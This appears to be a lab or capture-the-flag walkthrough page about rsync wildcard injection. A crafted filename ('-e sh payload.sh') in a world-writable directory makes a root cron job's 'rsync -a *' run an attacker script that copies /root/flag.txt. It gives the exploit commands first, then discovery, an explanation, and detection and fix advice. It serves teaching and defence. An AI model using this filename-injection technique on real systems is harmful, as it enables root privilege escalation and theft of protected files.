# C06 · Station B — rsync -e remote shell · ★★☆☆

> **Chapter:** [[Chapter-06-Overview]] · **Next:** [[C06-Station-C-chown-reference]]
> **Host:** `hollow-archive-01` (`target-wild`) · **Job:** `rsync -a * svcbackup@localhost:/srv/incoming/` in `/opt/sync`
> **The bug:** a filename becomes rsync's `-e` (remote-shell) option.

---

## 1. Exploit — do this first

```bash
cd /opt/sync
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > payload.sh
touch -- "-e sh payload.sh"
# wait <=60s:
cat /tmp/flag
```

---

## 2. How you find it

```bash
cat /usr/local/sbin/sync-run.sh   # rsync -a * host:  in a 0777 dir
ls -ld /opt/sync
```

## 3. Why it works

Because the job targets a **remote** spec (`host:path`), rsync honours `-e` to
pick its transport and runs it **locally as root**. After expansion the
filename `-e sh payload.sh` becomes the option, so rsync executes
`sh payload.sh` instead of `ssh`. The real transfer then fails — but your code
already ran.

## 4. Pitfalls

- The payload runs via rsync's transport launch, not over ssh — the lab's root
  ssh key to `svcbackup@localhost` only keeps the *benign* run from stalling.

## 5. Detect & fix

- **Detect:** `find / -name '-e*' -o -name '--*'`; an `rsync` whose child is `sh`/`bash`, not `ssh`.
- **Fix:** `./*` or `--`, or drive rsync from a fixed `--files-from=` manifest. [[Blue-Team-Playbook]].

## 6. What you learned

- The second-most-cited wildcard injection; backup crons that `rsync *` are the usual victims.

> Next: [[C06-Station-C-chown-reference]] · Related: [[C06-Station-A-tar-checkpoint]]
